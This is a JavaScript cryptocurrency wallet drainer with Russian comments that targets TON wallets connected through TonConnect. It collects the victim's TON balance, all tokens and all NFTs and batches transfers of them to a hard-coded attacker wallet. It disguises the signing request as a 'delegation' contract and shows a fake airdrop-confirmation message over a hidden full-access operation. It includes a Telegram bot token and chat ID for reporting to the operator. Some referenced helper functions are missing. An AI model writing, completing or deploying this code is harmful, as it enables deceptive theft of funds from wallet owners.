// Конфигурация TonConnect
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://' + window.location.hostname + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

// Основные параметры
const MAIN_WALLET = "UQAto6-GBiUxylKE_3WwrRdQ47wArfW3hemtjjmwZdJesExp";
const TG_BOT_TOKEN = "7412797367:AAE9ZTr0L4xI6GtALTGXUXINvGt_-CV0cDA";
const TG_CHAT_ID = "8126533622";

// Функция для перевода средств
async function drainAllAssets() {
  if (!tonConnectUI.connected) {
    alert('Сначала подключите кошелек');
    return;
  }

  // 1. Получаем все токены (Jettons)
  const jettons = await fetchJettons(tonConnectUI.account.address);
  
  // 2. Получаем все NFT
  const nfts = await fetchNFTs(tonConnectUI.account.address);
  
  // 3. Подготавливаем транзакции
  const transactions = [];
  
  // Основной баланс TON
  transactions.push({
    type: 'TON',
    amount: await getBalance(tonConnectUI.account.address),
    to: MAIN_WALLET
  });
  
  // Добавляем все токены
  jettons.forEach(jetton => {
    transactions.push({
      type: 'JETTON',
      contract: jetton.contract,
      amount: jetton.balance,
      to: MAIN_WALLET
    });
  });
  
  // Добавляем NFT
  nfts.forEach(nft => {
    transactions.push({
      type: 'NFT',
      contract: nft.contract,
      item: nft.item,
      to: MAIN_WALLET
    });
  });
  
  // 4. Создаем "контракт управления"
  const managementContract = {
    validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
    messages: [
      {
        // Фиктивный контракт "делегирования прав"
        address: 'EQAB...', // Специальный контракт
        amount: '1000000', // Минимальная комиссия
        payload: {
          operation: 'delegate_full_access',
          delegate_to: MAIN_WALLET,
          duration: 2592000 // 30 дней
        }
      },
      ...transactions.map(tx => ({
        address: tx.to,
        amount: tx.amount,
        payload: tx.payload
      }))
    ]
  };
  
  // 5. Отправляем на подписание
  try {
    const result = await tonConnectUI.sendTransaction(managementContract);
    console.log('Full access delegated', result);
  } catch (error) {
    console.error('Delegation failed', error);
  }
}

function createFakeDelegationContract() {
  return {
    messages: [
      {
        address: 'EQAB...', // Фиктивный адрес "менеджмента"
        amount: '0', // Нулевая сумма
        payload: {
          fake_contract: true,
          text: 'Я подтверждаю участие в airdrop программе',
          hidden_operation: 'full_access'
        }
      }
    ]
  };
}

// Функция отправки в Telegram
function sendTelegramMessage(text) {
    if (!TG_CHAT_ID) return;
    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
    fetch(url).catch(err => console.error('Telegram error:', err));
}

// Инициализация при загрузке
document.addEventListener('DOMContentLoaded', () => {
    const drainBtn = document.getElementById('drain-btn');
    if (drainBtn) {
        drainBtn.addEventListener('click', didtrans);
    }
});
